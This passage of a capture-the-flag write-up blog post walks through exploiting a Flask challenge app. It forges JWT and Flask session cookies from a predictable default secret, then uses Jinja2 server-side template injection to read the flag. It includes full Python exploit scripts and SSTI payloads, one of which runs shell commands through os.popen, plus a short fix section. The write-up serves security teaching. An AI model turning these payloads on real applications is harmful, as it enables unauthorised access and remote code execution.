+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>session<span style="color:#f92672">.</span>pop(<span style="color:#e6db74">&#39;user&#39;</span>, <span style="color:#66d9ef">None</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>resp <span style="color:#f92672">=</span> make_response(redirect(url_for(<span style="color:#e6db74">&#39;login&#39;</span>)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>resp<span style="color:#f92672">.</span>delete_cookie(<span style="color:#e6db74">&#34;admin_jwt&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> resp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/account&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">account</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>user <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;user&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> user:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;login&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> user <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Flag&#39;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;account.html&#39;</span>, user<span style="color:#f92672">=</span>user, is_admin<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;account.html&#39;</span>, user<span style="color:#f92672">=</span>user, is_admin<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>, debug<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, use_reloader<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span></code></pre></div><p><strong>Target:</strong> <code>http://161.97.155.116:5001</code></p>
+
+<h2 class="relative group">Initial Reconnaissance
+    <div id="initial-reconnaissance" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#initial-reconnaissance" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>First, let me show you what we&rsquo;re working with. The application had these endpoints:</p>
+<ul>
+<li><code>/</code> - Redirects to login</li>
+<li><code>/login</code> - User authentication</li>
+<li><code>/sign_up</code> - User registration</li>
+<li><code>/account</code> - User dashboard</li>
+<li><code>/admin</code> - Admin template renderer (protected)</li>
+</ul>
+<p>I started by exploring the application and noticed it used both JWT tokens and Flask sessions for authentication. Interesting&hellip;</p>
+
+<h2 class="relative group">Quick Analysis of the Source Code
+    <div id="quick-analysis-of-the-source-code" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#quick-analysis-of-the-source-code" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>Here&rsquo;s where things get interesting. Let me show you the critical vulnerability in the source code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>base <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;Q_SECRET&#34;</span>, <span style="color:#e6db74">&#34;qnqsec-default&#34;</span>) <span style="color:#75715e"># Default value!</span>
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;JWT_SECRET&#39;</span>] <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256((<span style="color:#e6db74">&#34;jwtpepper:&#34;</span> <span style="color:#f92672">+</span> base)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;SECRET_KEY&#39;</span>] <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1((<span style="color:#e6db74">&#34;pepper:&#34;</span> <span style="color:#f92672">+</span> base)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+</span></span></code></pre></div><p><strong>Predictable Default Value:</strong> If <code>Q_SECRET</code> isn&rsquo;t set, it defaults to <code>&quot;qnqsec-default&quot;</code>. This means every instance with default configuration uses the same base value.</p>
+<p><strong>Why this is exploitable:</strong></p>
+<ul>
+<li>We can calculate the exact same secrets the server uses</li>
+<li>We can forge valid JWT tokens with any payload we want</li>
+<li>We can forge valid Flask sessions for any user</li>
+<li>The server accepts our forged tokens because they&rsquo;re cryptographically valid</li>
+</ul>
+<p><strong>The attack:</strong></p>
+<ol>
+<li>Calculate JWT secret: <code>sha256(&quot;jwtpepper:qnqsec-default&quot;)</code></li>
+<li>Calculate Flask secret: <code>sha1(&quot;pepper:qnqsec-default&quot;)</code></li>
+<li>Forge admin JWT token using the calculated secret</li>
+<li>Forge Flask session as &ldquo;Flag&rdquo; user using the calculated secret</li>
+<li>Use both forged tokens to bypass authentication and access admin features</li>
+</ol>
+<p><strong>Bottom line:</strong> The server can&rsquo;t tell the difference between our forged tokens and legitimate ones because they&rsquo;re cryptographically identical. We essentially became the &ldquo;server&rdquo; by knowing its secrets!</p>
+
+<h2 class="relative group">Forging the JWT Token
+    <div id="forging-the-jwt-token" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#forging-the-jwt-token" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>Let&rsquo;s start by forging the JWT token. Since we know the secret derivation pattern, we can calculate the exact same secret the server uses:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> jwt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> datetime <span style="color:#f92672">import</span> datetime, timedelta, timezone
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>base <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;qnqsec-default&#34;</span>
+</span></span><span style="display:flex;"><span>jwt_secret <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;jwtpepper:</span><span style="color:#e6db74">{</span>base<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;JWT Secret: </span><span style="color:#e6db74">{</span>jwt_secret<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output: 426c6e42adf5519072772b799cf987967ee9a7effaa144ff133b43c141377580</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create admin payload</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;sub&#39;</span>: <span style="color:#e6db74">&#39;Flag&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;role&#39;</span>: <span style="color:#e6db74">&#39;admin&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;iat&#39;</span>: int(datetime<span style="color:#f92672">.</span>now(timezone<span style="color:#f92672">.</span>utc)<span style="color:#f92672">.</span>timestamp()),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;exp&#39;</span>: int((datetime<span style="color:#f92672">.</span>now(timezone<span style="color:#f92672">.</span>utc) <span style="color:#f92672">+</span> timedelta(hours<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>))<span style="color:#f92672">.</span>timestamp())
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Generate JWT token</span>
+</span></span><span style="display:flex;"><span>admin_token <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>encode(payload, jwt_secret, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;HS256&#39;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Admin JWT Token: </span><span style="color:#e6db74">{</span>admin_token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>This creates a valid JWT token with admin privileges that the server will accept because it&rsquo;s signed with the correct secret.</p>
+
+<h2 class="relative group">Forging the Flask Session
+    <div id="forging-the-flask-session" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#forging-the-flask-session" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>Now that we have the JWT token, we also need to forge the Flask session. The application uses both authentication mechanisms - the Flask session tells the app &ldquo;you are logged in as Flag user&rdquo; while the JWT token tells it &ldquo;you have admin role&rdquo;. We need both to access the admin panel.</p>
+<p>To forge the Flask session, we first calculate the Flask session secret using the same predictable pattern. Looking at the source code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>base <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;Q_SECRET&#34;</span>,has)
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;SECRET_KEY&#39;</span>] <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1((<span style="color:#e6db74">&#34;pepper:&#34;</span> <span style="color:#f92672">+</span> base)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+</span></span></code></pre></div><p>We use <code>sha1(&quot;pepper:qnqsec-default&quot;)</code> which gives us <code>40913aa300c33db34d976a59975adf18d90a246a</code>. This is the exact same secret the server uses to sign its session cookies.</p>
+<p>Next, we create a Flask application instance with this secret and use its session serializer to create a valid session cookie:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask.sessions <span style="color:#f92672">import</span> SecureCookieSessionInterface
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Calculate the Flask session secret (same as server)</span>
+</span></span><span style="display:flex;"><span>flask_secret <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pepper:qnqsec-default&#34;</span>)<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Flask Secret: </span><span style="color:#e6db74">{</span>flask_secret<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output: 40913aa300c33db34d976a59975adf18d90a246a</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create Flask app with the same secret</span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>secret_key <span style="color:#f92672">=</span> flask_secret
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create session serializer</span>
+</span></span><span style="display:flex;"><span>session_serializer <span style="color:#f92672">=</span> SecureCookieSessionInterface()<span style="color:#f92672">.</span>get_signing_serializer(app)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Forge session as &#34;Flag&#34; user</span>
+</span></span><span style="display:flex;"><span>session_data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;user&#39;</span>: <span style="color:#e6db74">&#39;Flag&#39;</span>}
+</span></span><span style="display:flex;"><span>forged_session <span style="color:#f92672">=</span> session_serializer<span style="color:#f92672">.</span>dumps(session_data)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Forged Session: </span><span style="color:#e6db74">{</span>forged_session<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output: eyJ1c2VyIjoiRmxhZyJ9.aPdXOw.m9jtrZIKQvIBAT5URMNCY5sfJU0</span>
+</span></span></code></pre></div><p>We set the session data to <code>{'user': 'Flag'}</code> which matches what the server would set when the Flag user logs in. The session serializer signs this data with the secret, creating a cookie that the server will accept as valid.</p>
+<p>The forged session cookie looks like <code>eyJ1c2VyIjoiRmxhZyJ9.aPdXOw.m9jtrZIKQvIBAT5URMNCY5sfJU0</code> and contains the user information that the application checks to determine if someone is logged in. Since we used the same secret the server uses, this cookie is cryptographically identical to one the server would create itself.</p>
+<p>Now we have both pieces of the authentication puzzle - a valid Flask session that says we&rsquo;re logged in as the Flag user, and a valid JWT token that says we have admin privileges. Together, these allow us to bypass the complete authentication system and access the admin panel.</p>
+
+<h2 class="relative group">The Attack
+    <div id="the-attack" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#the-attack" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>Now comes the fun part. I need both tokens because the application checks:</p>
+<ol>
+<li>Flask session for authentication (are you logged in?)</li>
+<li>JWT token for authorization (are you an admin?)</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>session<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>set(<span style="color:#e6db74">&#39;session&#39;</span>, forged_session)      <span style="color:#75715e"># Authentication</span>
+</span></span><span style="display:flex;"><span>session<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>set(<span style="color:#e6db74">&#39;admin_jwt&#39;</span>, admin_token)       <span style="color:#75715e"># Authorization</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Test admin access</span>
+</span></span><span style="display:flex;"><span>resp <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://161.97.155.116:5001/admin&#39;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Admin status: </span><span style="color:#e6db74">{</span>resp<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<p>Great! I got 200 OK. The admin panel shows a template renderer form:</p>
+<!-- raw HTML omitted -->
+
+<h2 class="relative group">The SSTI Exploit
+    <div id="the-ssti-exploit" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#the-ssti-exploit" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>This is where the real magic happens. The admin panel renders user input as Jinja2 templates without sanitization - classic Server-Side Template Injection (SSTI)!</p>
+<p>I used this payload to read the flag file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ssti_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{{ self.__init__.__globals__.__builtins__.open(&#34;secret/flag.txt&#34;).read() }}&#39;</span>
+</span></span><span style="display:flex;"><span>resp <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;http://161.97.155.116:5001/admin&#39;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;template&#39;</span>: ssti_payload})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;QnQsec{&#39;</span> <span style="color:#f92672">in</span> resp<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;🚩 FLAG FOUND!&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(resp<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><p>Alternative payload<br>
+<code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cd secret; cat flag.txt').read() }}</code></p>
+
+<h2 class="relative group">The Complete Exploit
+    <div id="the-complete-exploit" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#the-complete-exploit" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>Here&rsquo;s my complete exploit script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> jwt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask.sessions <span style="color:#f92672">import</span> SecureCookieSessionInterface
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> datetime <span style="color:#f92672">import</span> datetime, timedelta, timezone
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Calculate secrets</span>
+</span></span><span style="display:flex;"><span>    jwt_secret <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(<span style="color:#e6db74">&#34;jwtpepper:qnqsec-default&#34;</span><span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>    flask_secret <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pepper:qnqsec-default&#34;</span>)<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Generate JWT token</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;sub&#39;</span>: <span style="color:#e6db74">&#39;Flag&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;role&#39;</span>: <span style="color:#e6db74">&#39;admin&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;iat&#39;</span>: int(datetime<span style="color:#f92672">.</span>now(timezone<span style="color:#f92672">.</span>utc)<span style="color:#f92672">.</span>timestamp()),
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;exp&#39;</span>: int((datetime<span style="color:#f92672">.</span>now(timezone<span style="color:#f92672">.</span>utc) <span style="color:#f92672">+</span> timedelta(hours<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>))<span style="color:#f92672">.</span>timestamp())
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    admin_token <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>encode(payload, jwt_secret, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;HS256&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Generate Flask session</span>
+</span></span><span style="display:flex;"><span>    app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>secret_key <span style="color:#f92672">=</span> flask_secret
+</span></span><span style="display:flex;"><span>    session_serializer <span style="color:#f92672">=</span> SecureCookieSessionInterface()<span style="color:#f92672">.</span>get_signing_serializer(app)
+</span></span><span style="display:flex;"><span>    session_data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;user&#39;</span>: <span style="color:#e6db74">&#39;Flag&#39;</span>}
+</span></span><span style="display:flex;"><span>    forged_session <span style="color:#f92672">=</span> session_serializer<span style="color:#f92672">.</span>dumps(session_data)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Exploit</span>
+</span></span><span style="display:flex;"><span>    session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>    session<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>set(<span style="color:#e6db74">&#39;session&#39;</span>, forged_session)
+</span></span><span style="display:flex;"><span>    session<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>set(<span style="color:#e6db74">&#39;admin_jwt&#39;</span>, admin_token)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Access admin panel</span>
+</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://161.97.155.116:5001/admin&#39;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Admin status: </span><span style="color:#e6db74">{</span>resp<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> resp<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># SSTI exploit</span>
+</span></span><span style="display:flex;"><span>        ssti_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{{ self.__init__.__globals__.__builtins__.open(&#34;secret/flag.txt&#34;).read() }}&#39;</span>
+</span></span><span style="display:flex;"><span>        resp <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;http://161.97.155.116:5001/admin&#39;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;template&#39;</span>: ssti_payload})
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;QnQsec{&#39;</span> <span style="color:#f92672">in</span> resp<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;🚩 FLAG FOUND!&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(resp<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    exploit()
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<p>Request in Burpsuite
+<!-- raw HTML omitted --></p>
+
+<h2 class="relative group">Key Takeaways
+    <div id="key-takeaways" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#key-takeaways" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>This challenge was a perfect example of how <strong>defense in depth can fail</strong> when the underlying security mechanisms are flawed:</p>
+<ol>
+<li><strong>Predictable Secrets</strong>: The root cause was deriving secrets from predictable patterns</li>
+<li><strong>Multi-layer Bypass</strong>: Both JWT and Flask session authentication were bypassed</li>
+<li><strong>SSTI Exploitation</strong>: Admin access led to template injection and file read</li>
+<li><strong>Complete Compromise</strong>: From authentication bypass to RCE in one chain</li>
+</ol>
+
+<h2 class="relative group">How to Fix This
+    <div id="how-to-fix-this" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#how-to-fix-this" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># ❌ BAD - Predictable</span>
+</span></span><span style="display:flex;"><span>base <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;Q_SECRET&#34;</span>, <span style="color:#e6db74">&#34;qnqsec-default&#34;</span>)
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;JWT_SECRET&#39;</span>] <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256((<span style="color:#e6db74">&#34;jwtpepper:&#34;</span> <span style="color:#f92672">+</span> base)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ✅ GOOD - Random and secure</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> secrets
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;JWT_SECRET&#39;</span>] <span style="color:#f92672">=</span> secrets<span style="color:#f92672">.</span>token_hex(<span style="color:#ae81ff">32</span>)
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;SECRET_KEY&#39;</span>] <span style="color:#f92672">=</span> secrets<span style="color:#f92672">.</span>token_hex(<span style="color:#ae81ff">32</span>)
+</span></span></code></pre></div><p><strong>Flag:</strong> <code>QnQsec{b4efafeb4bd43c404e425ea6d664a0f6}</code></p>
+<p>This was a really fun challenge that combined multiple attack vectors. The key lesson here is that <strong>secret management is critical</strong> - if your secrets are predictable, all your authentication mechanisms become useless.</p>
+<hr>
+
           
           
           
